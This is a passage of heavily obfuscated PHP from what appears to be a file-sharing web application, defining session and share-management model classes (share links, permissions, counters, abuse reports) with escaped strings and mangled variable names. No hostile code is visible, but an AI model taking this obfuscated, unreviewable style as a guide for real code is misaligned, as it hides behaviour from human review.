$this->query("\123\105\x4c\x45\103\124\x20{$ø˜ŸÎÃ±}\x2e\x63\165\x72\x72\x76\x61\154\40\x63\x75\x72\162\166\x61\x6c\40\x46\x52\x4f\115\40\144\x75\141\154"); return $ ò¹›ô ? $ ò¹›ô[0][$üı†ºÂ[955]] : 0; } } } goto bÏ­’¤®Œƒ; F‰±àùˆÓã: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x73\x65\x73\163\x69\157\156"; public function get($Î­‹…â) { $®¤ÆÌæø =& $_SERVER[­á Ş³Ö]; $¾®Í½Ë = $this->where(array($®¤ÆÌæø[1987] => $Î­‹…â))->find(); if (!is_array($¾®Í½Ë)) { return !1; } return $¾®Í½Ë[$®¤ÆÌæø[751]]; } public function set($•™º„Ä, $¥å…Í¸÷, $±óß± Ó = 3600) { $ˆÊ™•İœ =& $_SERVER[­á Ş³Ö]; $éÕ™Çøª = array($ˆÊ™•İœ[1987] => $•™º„Ä, $ˆÊ™•İœ[1891] => $¥å…Í¸÷, $ˆÊ™•İœ[1988] => $±óß± Ó + time()); if (Session::get($ˆÊ™•İœ[1989])) { $éÕ™Çøª[$ˆÊ™•İœ[1663]] = Session::get($ˆÊ™•İœ[1989]); } else { $éÕ™Çøª[$ˆÊ™•İœ[1663]] = 0; } if ($this->get($•™º„Ä)) { return $this->where(array($ˆÊ™•İœ[1987] => $•™º„Ä))->save($éÕ™Çøª); } else { return $this->add($éÕ™Çøª, array(), !0); } } public function remove($±¢’›ú) { return $this->where(array($_SERVER[­á Ş³Ö][1987] => $±¢’›ú))->delete(); } public function clearTimeout() { return $this->where($_SERVER[­á Ş³Ö][1990] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\144\151\146\171\124\x69\155\x65", "\164\151\155\145", "\x69\x6e\163\145\162\x74\x2c\165\x70\x64\141\164\145", "\x66\165\156\x63\x74\151\157\x6e"), array("\143\x72\x65\x61\164\x65\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\x65\162\164", "\146\x75\x6e\143\164\x69\157\x6e"), array("\x6f\x70\164\x69\157\x6e\x73", '', "\x69\x6e\x73\145\x72\x74\54\x75\x70\144\141\164\x65\54\x73\x65\x6c\145\143\164", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($êıÉÕôò) { $à³“™ôÈ =& $_SERVER[­á Ş³Ö]; $—´Şá³ = isset($êıÉÕôò[0]) ? $êıÉÕôò[0] : !1; return array($à³“™ôÈ[1991] => array(USER_ID, $à³“™ôÈ[1992]), $à³“™ôÈ[1932] => array($—´Şá³, $à³“™ôÈ[1993])); } protected function listSimple() { $Ş¿ŒÎç = array($_SERVER[­á Ş³Ö][1663] => USER_ID); $¥ß«©» = $this->field($this->fieldList)->where($Ş¿ŒÎç)->select(); return $¥ß«©» ? $¥ß«©» : array(); } protected function getInfo($’œØáË­, $î›¥Üµ = false) { $­ÃÑÄ• =& $_SERVER[­á Ş³Ö]; if ($î›¥Üµ) { return $this->_getShareInfo(array($­ÃÑÄ•[593] => $’œØáË­)); } $š¼êì¹‘ = $this->cacheFunctionGet($­ÃÑÄ•[1934], $’œØáË­); return $š¼êì¹‘; } public function getInfoByHash($øğÑó¼) { return $this->_getShareInfo(array($_SERVER[­á Ş³Ö][1994] => $øğÑó¼)); } public function getInfoByPath($ÚäôƒùÏ) { $¹áË¿ï =& $_SERVER[­á Ş³Ö]; $’‹˜ğà¹ = array($¹áË¿ï[1663] => USER_ID, $¹áË¿ï[402] => $ÚäôƒùÏ); return $this->_getShareInfo($’‹˜ğà¹); } public function getInfoBySourcePath($¾îêãß‘) { $·³äŒ¥‚ =& $_SERVER[­á Ş³Ö]; $ Ò¨¨ó· = array($·³äŒ¥‚[1663] => USER_ID, $·³äŒ¥‚[1171] => $¾îêãß‘); return $this->_getShareInfo($ Ò¨¨ó·); } private function _getShareInfo($Çëíç) { $©Öâ«†” =& $_SERVER[­á Ş³Ö]; $ƒ±°„·¯ = $this->where($Çëíç)->find(); if (!$ƒ±°„·¯) { return !1; } $Çëíç = array($©Öâ«†”[593] => $ƒ±°„·¯[$©Öâ«†”[593]]); $Ş¿ñÆÔ = $©Öâ«†”[1995]; $ÆÌóØ§µ = Model($©Öâ«†”[594])->order($©Öâ«†”[399])->field($Ş¿ñÆÔ)->where($Çëíç)->select(); if ($ƒ±°„·¯[$©Öâ«†”[402]] == $©Öâ«†”[198]) { $ƒ±°„·¯[$©Öâ«†”[87]] = IO::info($ƒ±°„·¯[$©Öâ«†”[1171]]); } else { $ƒ±°„·¯[$©Öâ«†”[87]] = Model($©Öâ«†”[1335])->pathInfo($ƒ±°„·¯[$©Öâ«†”[402]]); } $ƒ±°„·¯[$©Öâ«†”[1996]] = $ÆÌóØ§µ; return $ƒ±°„·¯; } protected function getInfoAuth($©æÌÅŞ´) { $–‹‡ˆ§ï =& $_SERVER[­á Ş³Ö]; $ŠÆ‰…µª = $this->getInfo($©æÌÅŞ´); if ($ŠÆ‰…µª[$–‹‡ˆ§ï[1663]] == USER_ID) { $ŠÆ‰…µª[$–‹‡ˆ§ï[413]] = $ŠÆ‰…µª[$–‹‡ˆ§ï[87]][$–‹‡ˆ§ï[413]]; } else { $ŠÆ‰…µª[$–‹‡ˆ§ï[413]] = Model($–‹‡ˆ§ï[493])->authMake($ŠÆ‰…µª[$–‹‡ˆ§ï[1996]]); } return $ŠÆ‰…µª; } protected function listData($ñì‡÷Ñ = null, $Æºï€†¡ = 300) { $Â¥Ëâ› =& $_SERVER[­á Ş³Ö]; $‰Û¸ºøÍ = array(array($Â¥Ëâ›[488] => array($Â¥Ëâ›[1008], 0), $Â¥Ëâ›[591] => array($Â¥Ëâ›[1008], 0), $Â¥Ëâ›[1997] => $Â¥Ëâ›[1950])); if ($ñì‡÷Ñ == $Â¥Ëâ›[1998]) { $‰Û¸ºøÍ = array($Â¥Ëâ›[488] => 1); } else { if ($ñì‡÷Ñ == $Â¥Ëâ›[1157]) { $‰Û¸ºøÍ = array($Â¥Ëâ›[591] => 1); } } $‰Û¸ºøÍ[$Â¥Ëâ›[1663]] = USER_ID; $àĞò‚è³ = $this->where($‰Û¸ºøÍ)->selectPage($Æºï€†¡); return $àĞò‚è³; } protected function listToMe($Ä²–î¦¨ = 300) { $î÷¨Ï¦ =& $_SERVER[­á Ş³Ö]; $´ÆÓö×Ó = Model($î÷¨Ï¦[1999])->userGroupParents(USER_ID); $÷Ù€Ú‘È = array($î÷¨Ï¦[576] => SourceModel::TYPE_USER, $î÷¨Ï¦[496] => USER_ID); if ($´ÆÓö×Ó) { $÷Ù€Ú‘È = array(array($î÷¨Ï¦[576] => SourceModel::TYPE_USER, $î÷¨Ï¦[496] => USER_ID), array($î÷¨Ï¦[576] => SourceModel::TYPE_GROUP, $î÷¨Ï¦[496] => array($î÷¨Ï¦[7], $´ÆÓö×Ó)), $î÷¨Ï¦[1997] => $î÷¨Ï¦[1950]); } $»ùô„øô = Model($î÷¨Ï¦[594])->where($÷Ù€Ú‘È)->selectPage($Ä²–î¦¨); $ÇÊ“™°ü = array_to_keyvalue_group($»ùô„øô[$î÷¨Ï¦[369]], $î÷¨Ï¦[593]); if (!$ÇÊ“™°ü) { return $»ùô„øô; } $ÂÁ°Á‰³ = $î÷¨Ï¦[2000]; $÷Ù€Ú‘È = array($î÷¨Ï¦[593] => array($î÷¨Ï¦[418], array_keys($ÇÊ“™°ü)), $î÷¨Ï¦[1663] => array($î÷¨Ï¦[1010], $î÷¨Ï¦[198])); $²Ş…‰ = $this->field($ÂÁ°Á‰³)->where($÷Ù€Ú‘È)->select(); foreach ($²Ş…‰ as $ğòÉµ•¾ => &$Æò®í) { $Æò®í[$î÷¨Ï¦[1996]] = $ÇÊ“™°ü[$Æò®í[$î÷¨Ï¦[593]]]; } unset($Æò®í); $ö«àÈœ = array($î÷¨Ï¦[2001] => $²Ş…‰, $î÷¨Ï¦[2002] => $»ùô„øô[$î÷¨Ï¦[366]]); return $ö«àÈœ; } protected function shareAdd($“ÉÌ£İï, $¨¶°¥áß) { $¿‚ù«™¥ =& $_SERVER[­á Ş³Ö]; $ığ÷éâ = $this->_addShareData($“ÉÌ£İï, $¨¶°¥áß); if (!empty($¨¶°¥áß[$¿‚ù«™¥[2003]])) { $this->_shareAuthSet($ığ÷éâ, $¨¶°¥áß[$¿‚ù«™¥[2003]]); } $this->shareEventAdd($“ÉÌ£İï, $¨¶°¥áß, $¿‚ù«™¥[2004]); return $ığ÷éâ; } protected function shareAddSystem($¼­»ê·á, $ãÄ®É‰è) { $¿¤±¸•Í =& $_SERVER[­á Ş³Ö]; $›‘˜õ²í = $this->_addShareData($¼­»ê·á, $ãÄ®É‰è, $¿¤±¸•Í[1280]); $this->_shareAuthSet($›‘˜õ²í, $ãÄ®É‰è[$¿¤±¸•Í[2003]]); return $›‘˜õ²í; } private function shareEventAdd($ÇéØÌÒş, $Í¾²³, $ÀÂøÖ¯¤ = "\141\x64\x64") { $æÆØ–´– =& $_SERVER[­á Ş³Ö]; if (!$ÇéØÌÒş || $ÇéØÌÒş == $æÆØ–´–[198]) { return; } if ($ÀÂøÖ¯¤ == $æÆØ–´–[2004]) { if ($Í¾²³[$æÆØ–´–[488]] == $æÆØ–´–[88]) { Model($æÆØ–´–[561])->eventShare($ÇéØÌÒş, $æÆØ–´–[2005]); } if ($Í¾²³[$æÆØ–´–[591]] == $æÆØ–´–[88]) { Model($æÆØ–´–[561])->eventShare($ÇéØÌÒş, $æÆØ–´–[2006]); } return; } $§Ò‡Åš = $this->getInfoByPath($ÇéØÌÒş); $™ó½œ„Ì = $æÆØ–´–[2007]; if ($§Ò‡Åš[$æÆØ–´–[488]] == $æÆØ–´–[198] && $Í¾²³[$æÆØ–´–[488]] == $æÆØ–´–[88]) { $™ó½œ„Ì = $æÆØ–´–[2005]; } if ($§Ò‡Åš[$æÆØ–´–[488]] == $æÆØ–´–[88] && $Í¾²³[$æÆØ–´–[488]] == $æÆØ–´–[198]) { $™ó½œ„Ì = $æÆØ–´–[2008]; } if ($§Ò‡Åš[$æÆØ–´–[591]] == $æÆØ–´–[198] && $Í¾²³[$æÆØ–´–[591]] == $æÆØ–´–[88]) { $™ó½œ„Ì = $æÆØ–´–[2006]; } if ($§Ò‡Åš[$æÆØ–´–[591]] == $æÆØ–´–[88] && $Í¾²³[$æÆØ–´–[591]] == $æÆØ–´–[198]) { $™ó½œ„Ì = $æÆØ–´–[2009]; } Model($æÆØ–´–[561])->eventShare($ÇéØÌÒş, $™ó½œ„Ì); return; } private function _addShareData($İàÒî¯ú, $Œ¯èé™„ = array(), $¥“±öÛ² = false) { $³»É›á» =& $_SERVER[­á Ş³Ö]; $ã³Ğë = $¥“±öÛ² == $³»É›á»[1280] ? 0 : USER_ID; $”“Ïê³ì = array($³»É›á»[417] => $İàÒî¯ú, $³»É›á»[1654] => $ã³Ğë); if ($İàÒî¯ú == 0) { $”“Ïê³ì = array($³»É›á»[2010] => $Œ¯èé™„[$³»É›á»[1171]], $³»É›á»[1654] => $ã³Ğë); } if ($İáÁˆ î = $this->where($”“Ïê³ì)->find()) { return $İáÁˆ î[$³»É›á»[593]]; } if ($İàÒî¯ú == 0) { $Ù…êÄÊê = array($³»É›á»[32] => get_path_this($Œ¯èé™„[$³»É›á»[84]])); } else { $Ù…êÄÊê = Model($³»É›á»[822])->sourceInfo($İàÒî¯ú); if (!$Ù…êÄÊê) { return !1; } } if (!$Œ¯èé™„[$³»É›á»[1561]]) { $Œ¯èé™„[$³»É›á»[1561]] = $Ù…êÄÊê[$³»É›á»[32]]; } $ÍÂşœ€× = array($³»É›á»[1654] => $ã³Ğë, $³»É›á»[417] => $İàÒî¯ú, $³»É›á»[1561] => $³»É›á»[12], $³»É›á»[488] => 0, $³»É›á»[591] => 0, $³»É›á»[1171] => $³»É›á»[12], $³»É›á»[307] => $³»É›á»[12], $³»É›á»[885] => $³»É›á»[12], $³»É›á»[2011] => 0, $³»É›á»[2012] => 0, $³»É›á»[758] => 0, $³»É›á»[2013] => $³»É›á»[12], $³»É›á»[1994] => $³»É›á»[12]); $Äùõí¸Ÿ = explode($³»É›á»[50], $³»É›á»[2014]); foreach ($Äùõí¸Ÿ as $ìŒÃŒÎ¹) { if (!isset($Œ¯èé™„[$ìŒÃŒÎ¹])) { continue; } $ÍÂşœ€×[$ìŒÃŒÎ¹] = $Œ¯èé™„[$ìŒÃŒÎ¹]; } $¦¿üã· = $this->add($ÍÂşœ€×); $Í•¨÷Òî = array($³»É›á»[1994] => short_id($¦¿üã·)); $this->where(array($³»É›á»[2015] => $¦¿üã·))->save($Í•¨÷Òî); return $¦¿üã·; } private function _shareAuthSet($š«¥ŸÓñ, $ê‹ƒ“»Ú) { $Ü©‚ŸÌ =& $_SERVER[­á Ş³Ö]; if (!is_array($ê‹ƒ“»Ú)) { return !1; } $ŠÑØ¦ƒÂ = Model($Ü©‚ŸÌ[1960]); $ŠÑØ¦ƒÂ->where(array($Ü©‚ŸÌ[593] => $š«¥ŸÓñ))->delete(); $ÌÃ¹ôŒ¾ = array(); foreach ($ê‹ƒ“»Ú as $øœ½¦•¡) { $Â’€Ä¾« = SourceModel::TYPE_USER; if ($øœ½¦•¡[$Ü©‚ŸÌ[411]] == SourceModel::TYPE_GROUP) { $Â’€Ä¾« = SourceModel::TYPE_GROUP; } $ÁÏºáÖÀ = array($Ü©‚ŸÌ[593] => $š«¥ŸÓñ, $Ü©‚ŸÌ[411] => $Â’€Ä¾«, $Ü©‚ŸÌ[496] => intval($øœ½¦•¡[$Ü©‚ŸÌ[496]]), $Ü©‚ŸÌ[1956] => 0, $Ü©‚ŸÌ[2016] => -1); if ($øœ½¦•¡[$Ü©‚ŸÌ[1956]]) { $ÁÏºáÖÀ[$Ü©‚ŸÌ[1956]] = $øœ½¦•¡[$Ü©‚ŸÌ[1956]]; } else { if ($øœ½¦•¡[$Ü©‚ŸÌ[2016]]) { $ÁÏºáÖÀ[$Ü©‚ŸÌ[2016]] = $øœ½¦•¡[$Ü©‚ŸÌ[2016]]; } } $ÌÃ¹ôŒ¾[] = $ÁÏºáÖÀ; } return $ŠÑØ¦ƒÂ->addAll($ÌÃ¹ôŒ¾, array(), !0); } public function numViewAdd($Ÿ±í¢º›) { $ÔÁí¢Ñ€ =& $_SERVER[­á Ş³Ö]; $ß§æ„ã = array($ÔÁí¢Ñ€[2015] => $Ÿ±í¢º›); $this->where($ß§æ„ã)->setAdd($ÔÁí¢Ñ€[2011]); } public function numDownloadAdd($ùÙ’ËÀÚ) { $úßå©×Ò =& $_SERVER[­á Ş³Ö]; $¯Ñ˜°­­ = array($úßå©×Ò[2015] => $ùÙ’ËÀÚ); $this->where($¯Ñ˜°­­)->setAdd($úßå©×Ò[2012]); } protected function shareEdit($ø†˜Ô·®, $÷Ç—) { $°Ä±Æ­õ =& $_SERVER[­á Ş³Ö]; $ú‹Åùó = $this->getInfo($ø†˜Ô·®); if (!$ú‹Åùó) { return !1; } $this->_checkLinkShare($÷Ç—, $ú‹Åùó); $¿ó×¥Æ· = array(); $şÈ…Å© = explode($°Ä±Æ­õ[50], $°Ä±Æ­õ[2017]); foreach ($şÈ…Å© as $Â¨ÌÊœÖ) { if (!array_key_exists($Â¨ÌÊœÖ, $÷Ç—)) { continue; } $¿ó×¥Æ·[$Â¨ÌÊœÖ] = $÷Ç—[$Â¨ÌÊœÖ]; } $this->shareEventAdd($ú‹Åùó[$°Ä±Æ­õ[402]], $÷Ç—, $°Ä±Æ­õ[1822]); $this->where(array($°Ä±Æ­õ[2015] => $ø†˜Ô·®))->save($¿ó×¥Æ·); if (isset($÷Ç—[$°Ä±Æ­õ[2003]])) { $this->_shareAuthSet($ø†˜Ô·®, $÷Ç—[$°Ä±Æ­õ[2003]]); } return !0; } private function _checkLinkShare($Ñ­Äˆ , $¦Š­ËĞú) { $ÍõÍÜæë =& $_SERVER[­á Ş³Ö]; if ($Ñ­Äˆ [$ÍõÍÜæë[488]] != $ÍõÍÜæë[88]) { return; } $÷ÒÓ´®İ = $¦Š­ËĞú[$ÍõÍÜæë[87]][$ÍõÍÜæë[402]]; if ($¦Š­ËĞú[$ÍõÍÜæë[87]][$ÍõÍÜæë[33]] != $ÍõÍÜæë[200]) { $Ë‚×Ì‚ = $this->_folderReport($÷ÒÓ´®İ); if (!$Ë‚×Ì‚) { return; } show_json(LNG($ÍõÍÜæë[2018]) . $ÍõÍÜæë[2019] . $Ë‚×Ì‚, !1); } $¸Ò±²´Ç = Model($ÍõÍÜæë[822])->fileInfoGet($¦Š­ËĞú[$ÍõÍÜæë[87]][$ÍõÍÜæë[402]]); if (!$¸Ò±²´Ç) { return; } $í®ü¤ÊÙ = $this->shareFileMeta($¸Ò±²´Ç[$ÍõÍÜæë[468]]); if (isset($í®ü¤ÊÙ[$ÍõÍÜæë[374]]) && $í®ü¤ÊÙ[$ÍõÍÜæë[374]] == $ÍõÍÜæë[88]) { show_json(LNG($ÍõÍÜæë[2020]), !1); } } private function _folderReport($ÊÁŞš‚¿) { $©œè¼Şç =& $_SERVER[­á Ş³Ö]; $¥¯ºƒÙ† = array($©œè¼Şç[468] => array($©œè¼Şç[1008], 0), $©œè¼Şç[746] => 3); $ÈÉÁòîı = Model($©œè¼Şç[2021])->where($¥¯ºƒÙ†)->field($©œè¼Şç[468])->select(); if (!$ÈÉÁòîı) { return !1; } $ÈÉÁòîı = array_to_keyvalue($ÈÉÁòîı, $©œè¼Şç[12], $©œè¼Şç[468]); $—„‰ƒª˜ = $©œè¼Şç[50] . $ÊÁŞš‚¿ . $©œè¼Şç[50]; $¥¯ºƒÙ† = array($©œè¼Şç[468] => array($©œè¼Şç[7], $ÈÉÁòîı), $©œè¼Şç[511] => array($©œè¼Şç[383], "\x25{$—„‰ƒª˜}\45"), $©œè¼Şç[431] => 0); $Ö‹ëğõ… = Model($©œè¼Şç[822])->where($¥¯ºƒÙ†)->field($©œè¼Şç[2022])->find(); if (!$Ö‹ëğõ…) { return !1; } $„¿¨†Òİ = substr($Ö‹ëğõ…[$©œè¼Şç[511]], strpos($Ö‹ëğõ…[$©œè¼Şç[511]], $—„‰ƒª˜)); $¥¯ºƒÙ† = array($©œè¼Şç[402] => array($©œè¼Şç[7], trim($„¿¨†Òİ, $©œè¼Şç[50]))); $´¤Ïô’ù = Model($©œè¼Şç[822])->where($¥¯ºƒÙ†)->field($©œè¼Şç[32])->select(); $‹®ã×¦ = array_to_keyvalue($´¤Ïô’ù, $©œè¼Şç[12], $©œè¼Şç[32]); $‹®ã×¦[] = $Ö‹ëğõ…[$©œè¼Şç[32]]; return implode($©œè¼Şç[8], $‹®ã×¦); } protected function remove($—½š›ŒÌ) { $ö•Ê¯Ü° =& $_SERVER[­á Ş³Ö]; if (is_array($—½š›ŒÌ)) { $—½š›ŒÌ = array($ö•Ê¯Ü°[7], $—½š›ŒÌ); } $÷ÇåÉ¹­ = array($ö•Ê¯Ü°[593] => $—½š›ŒÌ); $¾òóÓ›‰ = $this->where($÷ÇåÉ¹­)->delete(); if ($¾òóÓ›‰) { Model($ö•Ê¯Ü°[594])->where(array($ö•Ê¯Ü°[593] => $—½š›ŒÌ))->delete(); } $éİêü„ë = is_array($—½š›ŒÌ) ? $—½š›ŒÌ[1] : array($—½š›ŒÌ); for ($âÜ­Ô² = 0; $âÜ­Ô² < count($éİêü„ë); $âÜ­Ô²++) { $…÷ÆíÍ“ = $this->getInfo($éİêü„ë[$âÜ­Ô²]); if ($…÷ÆíÍ“[$ö•Ê¯Ü°[591]] == $ö•Ê¯Ü°[88]) { Model($ö•Ê¯Ü°[561])->eventShare($…÷ÆíÍ“[$ö•Ê¯Ü°[402]], $ö•Ê¯Ü°[2009]); } if ($…÷ÆíÍ“[$ö•Ê¯Ü°[488]] == $ö•Ê¯Ü°[88]) { Model($ö•Ê¯Ü°[561])->eventShare($…÷ÆíÍ“[$ö•Ê¯Ü°[402]], $ö•Ê¯Ü°[2008]); } } return $¾òóÓ›‰; } protected function removeBySource($ûùõÈ¼) { $öË¦Ş¬Î =& $_SERVER[­á Ş³Ö]; $ôËÁ¡ê‘ = array($öË¦Ş¬Î[417] => array($öË¦Ş¬Î[418], $ûùõÈ¼)); $Œ¸†Å¯ = $this->field($öË¦Ş¬Î[593])->where($ôËÁ¡ê‘)->select(); $Œ¸†Å¯ = array_to_keyvalue($Œ¸†Å¯, $öË¦Ş¬Î[12], $öË¦Ş¬Î[593]); if (!$Œ¸†Å¯) { return; } $ôËÁ¡ê‘ = array($öË¦Ş¬Î[2015] => array($öË¦Ş¬Î[418], $Œ¸†Å¯)); $this->where($ôËÁ¡ê‘)->delete(); Model($öË¦Ş¬Î[594])->where($ôËÁ¡ê‘)->delete(); } public function listAll($ûè¶¥¢») { $”¼×ÓŸú =& $_SERVER[­á Ş³Ö]; $º€§Š› = array(); if ($ûè¶¥¢»[$”¼×ÓŸú[1663]]) { $º€§Š›[$”¼×ÓŸú[1663]] = $ûè¶¥¢»[$”¼×ÓŸú[1663]]; } if ($ûè¶¥¢»[$”¼×ÓŸú[757]]) { $©ªˆÚĞ = $ûè¶¥¢»[$”¼×ÓŸú[758]] ? $ûè¶¥¢»[$”¼×ÓŸú[758]] : strtotime(date($”¼×ÓŸú[2023])); $º€§Š›[$”¼×ÓŸú[201]] = array($”¼×ÓŸú[333], array($ûè¶¥¢»[$”¼×ÓŸú[757]], $©ªˆÚĞ)); } if ($ûè¶¥¢»[$”¼×ÓŸú[33]]) { $º€§Š›[$ûè¶¥¢»[$”¼×ÓŸú[33]]] = 1; } else { $º€§Š›[] = array($”¼×ÓŸú[488] => array($”¼×ÓŸú[1008], 0), $”¼×ÓŸú[591] => array($”¼×ÓŸú[1008], 0), $”¼×ÓŸú[1997] => $”¼×ÓŸú[1950]); } if ($ûè¶¥¢»[$”¼×ÓŸú[1946]]) { $º€§Š›[] = array($”¼×ÓŸú[1994] => $ûè¶¥¢»[$”¼×ÓŸú[1946]], $”¼×ÓŸú[1561] => array($”¼×ÓŸú[383], "\45{$ûè¶¥¢»[$”¼×ÓŸú[1946]]}\x25"), $”¼×ÓŸú[1997] => $”¼×ÓŸú[1950]); } $ÕÇ¼Ğšë = $this->_makeOrder()->where($º€§Š›)->selectPage(20); if (empty($ÕÇ¼Ğšë[$”¼×ÓŸú[369]])) { return array(); } $this->_listDataApply($ÕÇ¼Ğšë[$”¼×ÓŸú[369]]); return $ÕÇ¼Ğšë; } public function listDataApply($©—å­àî) { $this->_listDataApply($©—å­àî); return $©—å­àî; } private function _listDataApply(&$ÏîµÉâ¸) { $ÑŠäÓñã =& $_SERVER[­á Ş³Ö]; $‚Å÷Òí’ = array_to_keyvalue($ÏîµÉâ¸, $ÑŠäÓñã[12], $ÑŠäÓñã[1663]); $áÛ§Ä¥ø = Model($ÑŠäÓñã[525])->userListInfo(array_unique($‚Å÷Òí’)); $”ì•¶ãû = array_to_keyvalue($ÏîµÉâ¸, $ÑŠäÓñã[12], $ÑŠäÓñã[402]); $Åµ¢™— = Model($ÑŠäÓñã[822])->sourceListInfo($”ì•¶ãû, !0); foreach ($ÏîµÉâ¸ as $Öı£§¼ => &$éØ¿Ù›») { $à÷…¤ß = $éØ¿Ù›»[$ÑŠäÓñã[1663]]; $éØ¿Ù›»[$ÑŠäÓñã[2024]] = $áÛ§Ä¥ø[$à÷…¤ß] ? $áÛ§Ä¥ø[$à÷…¤ß] : !1; $şüğí™Ï = $éØ¿Ù›»[$ÑŠäÓñã[402]]; $éØ¿Ù›»[$ÑŠäÓñã[87]] = $Åµ¢™—[$şüğí™Ï] ? $Åµ¢™—[$şüğí™Ï] : !1; if ($éØ¿Ù›»[$ÑŠäÓñã[87]][$ÑŠäÓñã[431]] == $ÑŠäÓñã[88]) { unset($ÏîµÉâ¸[$Öı£§¼]); } if ($éØ¿Ù›»[$ÑŠäÓñã[87]] != $ÑŠäÓñã[198] && !$éØ¿Ù›»[$ÑŠäÓñã[87]]) { unset($ÏîµÉâ¸[$Öı£§¼]); } } unset($éØ¿Ù›»); $ÏîµÉâ¸ = array_values($ÏîµÉâ¸); } private function _makeOrder($¾¤´®¤æ = '') { $½ø Œğí =& $_SERVER[­á Ş³Ö]; $ªÉïßä½ = array($½ø Œğí[201], $½ø Œğí[758], $½ø Œğí[2011], $½ø Œğí[2012]); $Œ…’ªÑ = array($½ø Œğí[450] => $½ø Œğí[451], $½ø Œğí[452] => $½ø Œğí[453]); $ñğÛÍòÇ = Input::get($½ø Œğí[457], $½ø Œğí[7], $½ø Œğí[423], $ªÉïßä½); $å†Š¾¥ = Input::get($½ø Œğí[458], $½ø Œğí[7], $½ø Œğí[2025], array($½ø Œğí[1943], $½ø Œğí[452])); $å†Š¾¥ = $Œ…’ªÑ[$å†Š¾¥]; $¾¤´®¤æ = $¾¤´®¤æ . "{$ñğÛÍòÇ}\x20{$å†Š¾¥}"; return $this->order($¾¤´®¤æ); } public function reportAdd($•®â‰æ) { $Ó’ ¿¨ =& $_SERVER[­á Ş³Ö]; $À¼³Ş¼ = array($Ó’ ¿¨[593] => $•®â‰æ[$Ó’ ¿¨[593]], $Ó’ ¿¨[1663] => USER_ID); if (Model($Ó’ ¿¨[2021])->where($À¼³Ş¼)->find()) { return !1; } $¤ÔÏ¯šº = array($Ó’ ¿¨[593] => $•®â‰æ[$Ó’ ¿¨[593]], $Ó’ ¿¨[1561] => $•®â‰æ[$Ó’ ¿¨[1561]], $Ó’ ¿¨[402] => $•®â‰æ[$Ó’ ¿¨[402]], $Ó’ ¿¨[468] => $•®â‰æ[$Ó’ ¿¨[468]], $Ó’ ¿¨[1663] => USER_ID, $Ó’ ¿¨[33] => $•®â‰æ[$Ó’ ¿¨[33]], $Ó’ ¿¨[453] => $•®â‰æ[$Ó’ ¿¨[453]]); return Model($Ó’ ¿¨[2021])->add($¤ÔÏ¯šº); } public function reportList($×¤òˆ§â) { $«áØÇÍ =& $_SERVER[­á Ş³Ö]; $ëµóŠ²— = array(); if ($×¤òˆ§â[$«áØÇÍ[757]]) { $ƒ¾æõÄ = $×¤òˆ§â[$«áØÇÍ[758]] ? $×¤òˆ§â[$«áØÇÍ[758]] : strtotime(date($«áØÇÍ[2023])); $ëµóŠ²—[$«áØÇÍ[201]] = array($«áØÇÍ[333], array($×¤òˆ§â[$«áØÇÍ[757]], $ƒ¾æõÄ)); } if (isset($×¤òˆ§â[$«áØÇÍ[33]]) && in_array($×¤òˆ§â[$«áØÇÍ[33]], array($«áØÇÍ[88], $«áØÇÍ[437], $«áØÇÍ[2026], $«áØÇÍ[2027], $«áØÇÍ[2028]))) { $ëµóŠ²—[$«áØÇÍ[33]] = $×¤òˆ§â[$«áØÇÍ[33]]; } if (isset($×¤òˆ§â[$«áØÇÍ[746]]) && in_array($×¤òˆ§â[$«áØÇÍ[746]], array($«áØÇÍ[198], $«áØÇÍ[88], $«áØÇÍ[437], $«áØÇÍ[2026]))) { $ëµóŠ²—[$«áØÇÍ[746]] = $×¤òˆ§â[$«áØÇÍ[746]]; } $¼Ä„õùê = Input::get($«áØÇÍ[458], $«áØÇÍ[7], $«áØÇÍ[2025], array($«áØÇÍ[1943], $«áØÇÍ[452])); $¹şê¶«  = array($«áØÇÍ[450] => $«áØÇÍ[451], $«áØÇÍ[452] => $«áØÇÍ[453]); $¿„œµ«Á = $«áØÇÍ[2029] . $¹şê¶« [$¼Ä„õùê]; $Ğ²¥ƒÌª = Model($«áØÇÍ[2021])->where($ëµóŠ²—)->order($¿„œµ«Á)->selectPage(20); if (empty($Ğ²¥ƒÌª[$«áØÇÍ[369]])) { return array(); } $­Ä’¼ Ñ = array_to_keyvalue_group($Ğ²¥ƒÌª[$«áØÇÍ[369]], $«áØÇÍ[746], $«áØÇÍ[593]); if (!empty($­Ä’¼ Ñ[0])) { $×¤òˆ§â = $­Ä’¼ Ñ[0]; $ëµóŠ²— = array($«áØÇÍ[593] => array($«áØÇÍ[7], $×¤òˆ§â)); $²ÖˆÁäÓ = $this->where($ëµóŠ²—)->field($«áØÇÍ[593])->select(); $²ÖˆÁäÓ = array_to_keyvalue($²ÖˆÁäÓ, $«áØÇÍ[12], $«áØÇÍ[593]); $«­‘ÔÂ£ = array_diff($×¤òˆ§â, $²ÖˆÁäÓ); if (!empty($«­‘ÔÂ£)) { foreach ($Ğ²¥ƒÌª[$«áØÇÍ[369]] as $ÈŞ ÑÈü => $Çù®Í“Æ) { if (in_array($Çù®Í“Æ[$«áØÇÍ[593]], $«­‘ÔÂ£)) { unset($Ğ²¥ƒÌª[$«áØÇÍ[369]][$ÈŞ ÑÈü]); } } } } $this->_listDataApply($Ğ²¥ƒÌª[$«áØÇÍ[369]]); return $Ğ²¥ƒÌª; } public function reportStatus($Ğ¢˜•Å) { $ß¹º’ˆ¾ =& $_SERVER[­á Ş³Ö]; $çÉÄÂ÷¢ = array($ß¹º’ˆ¾[399] => $Ğ¢˜•Å[$ß¹º’ˆ¾[399]]); $€×ˆŸû† = Model($ß¹º’ˆ¾[2021])->where($çÉÄÂ÷¢)->field($ß¹º’ˆ¾[2030])->find(); if (!$€×ˆŸû†) { return !1; } $Ìá×¡ƒ = array($ß¹º’ˆ¾[746] => $Ğ¢˜•Å[$ß¹º’ˆ¾[746]]); if ($Ğ¢˜•Å[$ß¹º’ˆ¾[746]] == $ß¹º’ˆ¾[2026] && $€×ˆŸû†[$ß¹º’ˆ¾[746]] == $ß¹º’ˆ¾[2026]) { $Ìá×¡ƒ[$ß¹º’ˆ¾[746]] = 0; } $¾”×•õµ = Model($ß¹º’ˆ¾[2021])->where($çÉÄÂ÷¢)->save($Ìá×¡ƒ); if 